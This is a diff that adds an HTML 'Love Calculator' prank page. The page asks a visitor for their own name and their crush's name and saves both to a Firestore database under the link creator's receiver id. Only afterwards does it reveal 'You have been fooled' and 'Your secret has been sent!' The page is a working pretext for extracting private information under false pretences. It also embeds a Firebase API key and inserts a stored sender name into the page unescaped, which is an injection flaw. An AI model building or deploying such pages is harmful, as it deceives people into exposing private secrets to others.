@@ -1,0 +1,71 @@
+<!DOCTYPE html>
+<html>
+<head>
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>Love Calculator</title>
+<link rel="stylesheet" href="style.css">
+</head>
+<body class="bg center">
+
+<div class="card" id="card">
+  <div id="form">
+    <h2>💖 Love Calculator</h2>
+    <input id="fname" placeholder="Your Name">
+    <input id="cname" placeholder="Crush Name">
+    <button class="btn" onclick="submit()">Calculate ❤️</button>
+  </div>
+</div>
+
+<script type="module">
+import { initializeApp } from "https://www.gstatic.com/firebasejs/10.7.1/firebase-app.js";
+import { getFirestore, collection, addDoc, getDocs, query, where } from "https://www.gstatic.com/firebasejs/10.7.1/firebase-firestore.js";
+
+const firebaseConfig = {
+  apiKey: "AIzaSyB1sYh3UGcubBmxmq70aMAURpolLBGM2_M",
+  authDomain: "love-calculator-12.firebaseapp.com",
+  projectId: "love-calculator-12",
+  storageBucket: "love-calculator-12.firebasestorage.app",
+  messagingSenderId: "707941034632",
+  appId: "1:707941034632:web:7b6b5a7149b73f7e80cd3d",
+  measurementId: "G-CW6SHK3C2T"
+};
+
+const app = initializeApp(firebaseConfig);
+const db = getFirestore(app);
+
+const rid = new URLSearchParams(location.search).get("rid");
+if (!rid) {
+  card.innerHTML = "<h3>Invalid link ❌</h3>";
+  throw new Error("Invalid receiver id");
+}
+
+window.submit = async () => {
+  if(!fname.value || !cname.value) return alert("Fill both names");
+
+  await addDoc(collection(db,"entries"),{
+    receiverId: rid,
+    friend: fname.value,
+    crush: cname.value,
+    time: Date.now()
+  });
+
+  const q = query(collection(db,"senders"), where("receiverId","==",rid));
+  const snap = await getDocs(q);
+
+  if (snap.empty) {
+    card.innerHTML = "<h3>Link expired ❌</h3>";
+    return;
+  }
+
+  const sender = snap.docs[0].data().senderName;
+
+  card.innerHTML = `
+    <h3>You have been fooled by <b>${sender}</b> 😈</h3>
+    <p>Your secret has been sent!</p>
+    <a href="create.html" class="btn">Create Your Own Prank</a>
+  `;
+};
+</script>
+
+</body>
+</html>
